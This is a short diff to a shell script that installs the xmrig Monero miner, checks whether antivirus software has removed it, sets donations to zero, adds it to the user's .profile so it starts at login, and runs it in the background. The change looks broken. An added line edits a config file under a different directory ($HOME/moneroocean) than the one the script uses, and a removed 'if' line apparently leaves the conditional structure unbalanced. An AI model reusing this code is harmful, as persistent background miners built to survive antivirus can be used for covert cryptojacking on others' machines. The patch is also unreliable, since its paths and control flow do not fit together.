@@ -123,6 +123,7 @@ if (test $? -ne 0); then
 
   echo "[*] Checking if stock version of $HOME/minershell-main/xmrig works fine (and not removed by antivirus software)"
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/minershell-main/config.json
+  sed -i 's#"log-file": *null,#"log-file": "'$HOME/moneroocean/xmrig.log'",#' $HOME/moneroocean/config.json
   $HOME/minershell-main/xmrig --help >/dev/null
   if (test $? -ne 0); then 
     if [ -f $HOME/minershell-main/xmrig ]; then
@@ -166,8 +167,6 @@ chmod +x $HOME/minershell-main/miner.sh
     echo "Looks like $HOME/minershell-main/miner.sh script is already in the $HOME/.profile"
   fi
   echo "[*] Running miner in the background (see logs in $HOME/minershell-main/xmrig.log file)"
-
-  if ! type systemctl >/dev/null; then
 
     echo "[*] Running miner in the background (see logs in $HOME/minershell-main/xmrig.log file)"
 
